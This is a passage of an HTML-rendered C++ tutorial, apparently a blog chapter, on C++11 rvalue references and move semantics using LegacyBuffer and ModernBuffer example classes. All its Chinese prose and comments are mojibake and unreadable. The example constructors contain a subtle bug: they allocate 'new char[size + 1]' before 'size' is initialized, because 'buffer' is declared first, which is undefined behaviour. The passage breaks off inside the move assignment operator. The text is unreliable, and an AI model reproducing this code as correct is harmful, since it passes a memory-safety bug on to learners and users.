class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> Vec = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;T&gt;; <span class="comment">// Vec&lt;int&gt; ç­‰ä»·äº std::vector&lt;int&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="18-1-9-å³å€¼å¼•ç”¨"><a href="#18-1-9-å³å€¼å¼•ç”¨" class="headerlink" title="18.1.9 å³å€¼å¼•ç”¨"></a>18.1.9 å³å€¼å¼•ç”¨</h3><p>(æœ¬èŠ‚ä¸»è¦å›é¡¾ï¼Œä½†å³å€¼å¼•ç”¨å’Œç§»åŠ¨è¯­ä¹‰åœ¨ 18.2 è¯¦ç»†ä»‹ç»ï¼Œè¿™é‡Œä»…æåŠæ¦‚å¿µ)<br>C++11 å¼•å…¥äº†ä¸€ä¸ªé‡è¦çš„åº•å±‚æ¦‚å¿µâ€”â€”<strong>å³å€¼å¼•ç”¨ (Rvalue Reference)**ï¼Œä½¿ç”¨ <code>&amp;&amp;</code> è¡¨ç¤ºã€‚å³å€¼å¼•ç”¨ä¸»è¦ç”¨äºå®ç°</strong>ç§»åŠ¨è¯­ä¹‰ (Move Semantics)** å’Œ**å®Œç¾è½¬å‘ (Perfect Forwarding)**ã€‚ç§»åŠ¨è¯­ä¹‰å…è®¸èµ„æºï¼ˆå¦‚åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼‰ä»ä¸€ä¸ªå¯¹è±¡â€œç§»åŠ¨â€åˆ°å¦ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä¸æ˜¯è¿›è¡Œæ˜‚è´µçš„å¤åˆ¶ï¼Œè¿™å¯¹äºä¼˜åŒ–æ¶‰åŠä¸´æ—¶å¯¹è±¡æˆ–èµ„æºè½¬ç§»çš„æ“ä½œè‡³å…³é‡è¦ï¼ˆä¾‹å¦‚ <code>unique_ptr</code> çš„æ‰€æœ‰æƒè½¬ç§»ï¼Œ<code>vector</code> å¢é•¿æ—¶çš„å…ƒç´ ç§»åŠ¨ï¼‰ã€‚ç§»åŠ¨è¯­ä¹‰å°†åœ¨ 18.2 èŠ‚è¯¦ç»†æ¢è®¨ã€‚</p><p>è¿™äº› C++11 ç‰¹æ€§å…±åŒä½¿å¾— C++ ä»£ç å¯ä»¥å†™å¾—æ›´ç°ä»£ã€æ›´å®‰å…¨ã€æ›´é«˜æ•ˆã€‚</p><h2 id="18-2-ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨"><a href="#18-2-ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨" class="headerlink" title="18.2 ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨"></a>18.2 ç§»åŠ¨è¯­ä¹‰å’Œå³å€¼å¼•ç”¨</h2><p>C++11 å¼•å…¥äº†<strong>å³å€¼å¼•ç”¨ (Rvalue Reference)</strong> å’Œ**ç§»åŠ¨è¯­ä¹‰ (Move Semantics)**ï¼Œè¿™æ˜¯ C++11 æœ€é‡è¦çš„ç‰¹æ€§ä¹‹ä¸€ï¼Œæ—¨åœ¨æé«˜æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯å¯¹äºç®¡ç†èµ„æºçš„ç±»ï¼ˆå¦‚åŠ¨æ€åˆ†é…å†…å­˜ã€æ–‡ä»¶å¥æŸ„ã€ç½‘ç»œè¿æ¥ç­‰ï¼‰ã€‚</p><h3 id="18-2-1-ä¸ºä½•éœ€è¦ç§»åŠ¨è¯­ä¹‰"><a href="#18-2-1-ä¸ºä½•éœ€è¦ç§»åŠ¨è¯­ä¹‰" class="headerlink" title="18.2.1 ä¸ºä½•éœ€è¦ç§»åŠ¨è¯­ä¹‰"></a>18.2.1 ä¸ºä½•éœ€è¦ç§»åŠ¨è¯­ä¹‰</h3><p>è€ƒè™‘ä¸€ä¸ªç®¡ç†åŠ¨æ€å†…å­˜çš„ç±»ï¼Œä¾‹å¦‚ä¸€ä¸ªç®€å•çš„å­—ç¬¦ä¸²ç±»æˆ–ä¸€ä¸ªæŒæœ‰å¤§ç¼“å†²åŒºçš„ç±»ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // for strlen, strcpy</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt; // for std::swap</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LegacyBuffer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span>* buffer;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Constructor</span></span><br><span class="line">    LegacyBuffer(<span class="keyword">const</span> <span class="keyword">char</span>* s = <span class="string">&quot;&quot;</span>) : size(<span class="built_in">std</span>::<span class="built_in">strlen</span>(s)), buffer(<span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor called for &#x27;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destructor</span></span><br><span class="line">    ~LegacyBuffer() &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Destructor called for buffer at &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Constructor (Deep Copy)</span></span><br><span class="line">    LegacyBuffer(<span class="keyword">const</span> LegacyBuffer&amp; other) : size(other.size), buffer(<span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Copy Constructor called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, other.buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Assignment Operator (Deep Copy)</span></span><br><span class="line">    LegacyBuffer&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> LegacyBuffer&amp; other) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Copy Assignment called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;other) &#123; <span class="comment">// Self-assignment check</span></span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer; <span class="comment">// Release old resource</span></span><br><span class="line">        size = other.size;</span><br><span class="line">        buffer = <span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]; <span class="comment">// Allocate new resource</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, other.buffer); <span class="comment">// Copy data</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer content: &quot;</span> &lt;&lt; (buffer ? buffer : <span class="string">&quot;null&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(LegacyBuffer&amp; first, LegacyBuffer&amp; second)</span> <span class="keyword">noexcept</span> </span>&#123;</span><br><span class="line">         <span class="keyword">using</span> <span class="built_in">std</span>::swap;</span><br><span class="line">         swap(first.size, second.size);</span><br><span class="line">         swap(first.buffer, second.buffer);</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer swapped via friend swap\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">LegacyBuffer <span class="title">createBuffer</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> LegacyBuffer(s); <span class="comment">// è¿”å›ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ (rvalue)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ C++11 ä¹‹å‰ï¼Œå½“å¤„ç†<strong>ä¸´æ—¶å¯¹è±¡ (Temporary Objects)</strong> æˆ–å³å°†é”€æ¯çš„å¯¹è±¡æ—¶ï¼Œå¤åˆ¶æ„é€ å‡½æ•°å’Œå¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¼šå¯¼è‡´ä¸å¿…è¦çš„**æ·±æ‹·è´ (Deep Copy)**ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">LegacyBuffer <span class="title">b1</span><span class="params">(<span class="string">&quot;Original&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    LegacyBuffer b2 = b1; <span class="comment">// è°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•° (æ·±æ‹·è´) - åˆç†ï¼Œéœ€è¦ç‹¬ç«‹å‰¯æœ¬</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">LegacyBuffer <span class="title">b3</span><span class="params">(<span class="string">&quot;Temporary Source&quot;</span>)</span></span>;</span><br><span class="line">    b1 = b3; <span class="comment">// è°ƒç”¨å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (æ·±æ‹·è´) - åˆç†</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é—®é¢˜æ‰€åœ¨ï¼šå¤„ç†ä¸´æ—¶å¯¹è±¡</span></span><br><span class="line">    LegacyBuffer b4 = createBuffer(<span class="string">&quot;Temporary&quot;</span>); <span class="comment">// 1. createBuffer è¿”å›ä¸´æ—¶å¯¹è±¡</span></span><br><span class="line">                                                 <span class="comment">// 2. ä¸´æ—¶å¯¹è±¡è¢« *å¤åˆ¶* åˆ° b4 (è°ƒç”¨å¤åˆ¶æ„é€ å‡½æ•°)</span></span><br><span class="line">                                                 <span class="comment">// 3. ä¸´æ—¶å¯¹è±¡è¢«é”€æ¯</span></span><br><span class="line">                                                 <span class="comment">// (ç¼–è¯‘å™¨ä¼˜åŒ– RVO/NRVO å¯èƒ½æ¶ˆé™¤è¿™æ¬¡å¤åˆ¶ï¼Œä½†æ¦‚å¿µä¸Šå­˜åœ¨)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    b1 = createBuffer(<span class="string">&quot;Another Temp&quot;</span>); <span class="comment">// 1. createBuffer è¿”å›ä¸´æ—¶å¯¹è±¡</span></span><br><span class="line">                                       <span class="comment">// 2. ä¸´æ—¶å¯¹è±¡è¢« *å¤åˆ¶* èµ‹å€¼ç»™ b1 (è°ƒç”¨å¤åˆ¶èµ‹å€¼)</span></span><br><span class="line">                                       <span class="comment">// 3. ä¸´æ—¶å¯¹è±¡è¢«é”€æ¯</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å¤„ç† <code>createBuffer</code> è¿”å›çš„ä¸´æ—¶å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å®é™…ä¸Šåªæ˜¯æƒ³æŠŠä¸´æ—¶å¯¹è±¡å†…éƒ¨ç®¡ç†çš„èµ„æºï¼ˆ<code>buffer</code> æŒ‡é’ˆå’Œ <code>size</code>ï¼‰<strong>è½¬ç§»</strong>ç»™æ–°çš„å¯¹è±¡ (<code>b4</code> æˆ– <code>b1</code>)ï¼Œå› ä¸ºä¸´æ—¶å¯¹è±¡é©¬ä¸Šå°±è¦è¢«é”€æ¯äº†ï¼Œå®ƒçš„èµ„æºæ²¡ç”¨äº†ã€‚è¿›è¡Œæ·±æ‹·è´ï¼ˆé‡æ–°åˆ†é…å†…å­˜å¹¶å¤åˆ¶å†…å®¹ï¼‰æ˜¯ä¸€ç§æµªè´¹ã€‚</p><p>ç§»åŠ¨è¯­ä¹‰å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼šå…è®¸æˆ‘ä»¬<strong>â€œçªƒå–â€</strong>æˆ–<strong>â€œç§»åŠ¨â€</strong>æ¥è‡ªä¸´æ—¶å¯¹è±¡æˆ–æ˜ç¡®æ ‡è®°ä¸ºå¯ç§»åŠ¨å¯¹è±¡çš„èµ„æºï¼Œè€Œä¸æ˜¯å¤åˆ¶å®ƒä»¬ã€‚</p><h3 id="å³å€¼å¼•ç”¨-amp-amp"><a href="#å³å€¼å¼•ç”¨-amp-amp" class="headerlink" title="å³å€¼å¼•ç”¨ (&amp;&amp;)"></a>å³å€¼å¼•ç”¨ (<code>&amp;&amp;</code>)</h3><p>ä¸ºäº†åŒºåˆ†å¯ä»¥å®‰å…¨â€œçªƒå–â€èµ„æºçš„ä¸´æ—¶å¯¹è±¡å’Œä¸èƒ½çªƒå–çš„æŒä¹…å¯¹è±¡ï¼ˆå·¦å€¼ï¼‰ï¼ŒC++11 å¼•å…¥äº†**å³å€¼å¼•ç”¨ (Rvalue Reference)**ï¼Œç”¨ <code>&amp;&amp;</code> è¡¨ç¤ºã€‚</p><ul><li>  <strong>å·¦å€¼ (Lvalue):</strong> é€šå¸¸æŒ‡é‚£äº›æœ‰åå­—ã€å¯ä»¥å–åœ°å€ã€åœ¨è¡¨è¾¾å¼ç»“æŸåä»ç„¶å­˜åœ¨çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œå˜é‡å <code>b1</code>, <code>b2</code>ã€‚</li><li>  <strong>å³å€¼ (Rvalue):</strong> é€šå¸¸æŒ‡é‚£äº›ä¸´æ—¶çš„ã€æ²¡æœ‰åå­—ã€åœ¨è¡¨è¾¾å¼ç»“æŸåå³å°†é”€æ¯çš„å€¼ã€‚ä¾‹å¦‚ï¼Œå‡½æ•°è¿”å›å€¼ <code>createBuffer(&quot;Temporary&quot;)</code>ï¼Œå­—é¢å¸¸é‡ <code>10</code>, <code>&quot;Hello&quot;</code>ï¼Œç®—æœ¯è¡¨è¾¾å¼çš„ç»“æœ <code>x + y</code>ã€‚</li><li>  <strong>å·¦å€¼å¼•ç”¨ (<code>&amp;</code>):</strong> åªèƒ½ç»‘å®šåˆ°å·¦å€¼ã€‚<code>LegacyBuffer&amp; ref = b1;</code> (OK), <code>LegacyBuffer&amp; ref = createBuffer(&quot;Temp&quot;);</code> (é”™è¯¯!)ã€‚ (const å·¦å€¼å¼•ç”¨ <code>const LegacyBuffer&amp;</code> æ˜¯ä¸ªä¾‹å¤–ï¼Œå®ƒå¯ä»¥ç»‘å®šåˆ°å³å€¼)ã€‚</li><li>  <strong>å³å€¼å¼•ç”¨ (<code>&amp;&amp;</code>):</strong> åªèƒ½ç»‘å®šåˆ°å³å€¼ã€‚<code>LegacyBuffer&amp;&amp; rref = createBuffer(&quot;Temp&quot;);</code> (OK), <code>LegacyBuffer&amp;&amp; rref = b1;</code> (é”™è¯¯!)ã€‚</li></ul><p>å³å€¼å¼•ç”¨ <code>&amp;&amp;</code> çš„å¼•å…¥ä½¿å¾—æˆ‘ä»¬å¯ä»¥é‡è½½å‡½æ•°ï¼ˆç‰¹åˆ«æ˜¯æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ï¼‰ï¼Œè®©å®ƒä»¬èƒ½å¤ŸåŒºåˆ†æ¥æ”¶çš„æ˜¯å·¦å€¼è¿˜æ˜¯å³å€¼ï¼Œä»è€Œå¯¹å³å€¼ï¼ˆä¸´æ—¶å¯¹è±¡ï¼‰é‡‡å–ä¸åŒçš„ã€æ›´é«˜æ•ˆçš„æ“ä½œï¼ˆç§»åŠ¨ï¼‰ã€‚</p><h3 id="18-2-2-ä¸€ä¸ªç§»åŠ¨ç¤ºä¾‹"><a href="#18-2-2-ä¸€ä¸ªç§»åŠ¨ç¤ºä¾‹" class="headerlink" title="18.2.2 ä¸€ä¸ªç§»åŠ¨ç¤ºä¾‹"></a>18.2.2 ä¸€ä¸ªç§»åŠ¨ç¤ºä¾‹</h3><p>ç°åœ¨æˆ‘ä»¬ä¸º <code>LegacyBuffer</code> ç±»æ·»åŠ ç§»åŠ¨æ„é€ å‡½æ•°å’Œç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt; // for std::move and std::swap</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ModernBuffer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span>* buffer;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Constructor</span></span><br><span class="line">    ModernBuffer(<span class="keyword">const</span> <span class="keyword">char</span>* s = <span class="string">&quot;&quot;</span>) : size(<span class="built_in">std</span>::<span class="built_in">strlen</span>(s)), buffer(<span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor called for &#x27;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destructor</span></span><br><span class="line">    ~ModernBuffer() &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Destructor called for buffer at &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Constructor (Deep Copy)</span></span><br><span class="line">    ModernBuffer(<span class="keyword">const</span> ModernBuffer&amp; other) : size(other.size), buffer(<span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Copy Constructor called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, other.buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Assignment Operator (Deep Copy)</span></span><br><span class="line">    ModernBuffer&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> ModernBuffer&amp; other) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Copy Assignment called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;other) &#123;</span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ copy-and-swap idiom æ›´å®‰å…¨</span></span><br><span class="line">        <span class="function">ModernBuffer <span class="title">temp</span><span class="params">(other)</span></span>; <span class="comment">// è°ƒç”¨å¤åˆ¶æ„é€ </span></span><br><span class="line">        swap(*<span class="keyword">this</span>, temp);        <span class="comment">// äº¤æ¢èµ„æº</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// æ—§æ–¹å¼ï¼š</span></span><br><span class="line">        <span class="comment">// delete[] buffer;</span></span><br><span class="line">        <span class="comment">// size = other.size;</span></span><br><span class="line">        <span class="comment">// buffer = new char[size + 1];</span></span><br><span class="line">        <span class="comment">// std::strcpy(buffer, other.buffer);</span></span><br><span class="line">        <span class="comment">// return *this;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *** Move Constructor (C++11) ***</span></span><br><span class="line">    ModernBuffer(ModernBuffer&amp;&amp; other) <span class="keyword">noexcept</span> <span class="comment">// æ¥æ”¶å³å€¼å¼•ç”¨ï¼Œæ ‡è®°ä¸º noexcept</span></span><br><span class="line">        : size(other.size), buffer(other.buffer) <span class="comment">// 1. çªƒå–èµ„æº (æµ…æ‹·è´æŒ‡é’ˆå’Œå¤§å°)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Move Constructor called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 2. å°†æºå¯¹è±¡ç½®äºæœ‰æ•ˆä½†å¯ææ„çš„çŠ¶æ€ (é€šå¸¸æ˜¯ç½®ç©º)</span></span><br><span class="line">        other.size = <span class="number">0</span>;</span><br><span class="line">        other.buffer = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *** Move Assignment Operator (C++11) ***</span></span><br><span class="line">    ModernBuffer&amp; <span class="keyword">operator</span>=(ModernBuffer&amp;&amp; other) <span class="keyword">noexcept</span> <span class="comment">// æ¥æ”¶å³å€¼å¼•ç”¨ï¼Œæ ‡è®°ä¸º noexcept</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Move Assignment called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;other) &#123; <span class="comment">// è‡ªèµ‹å€¼æ£€æŸ¥ (è™½ç„¶å¯¹å³å€¼ä¸å¤ªå¯èƒ½ï¼Œä½†ä¿æŒè‰¯å¥½ä¹ æƒ¯)</span></span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 1. é‡Šæ”¾å½“å‰å¯¹è±¡çš„èµ„æº</span></span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. çªƒå–æºå¯¹è±¡çš„èµ„æº</span></span><br><span class="line">        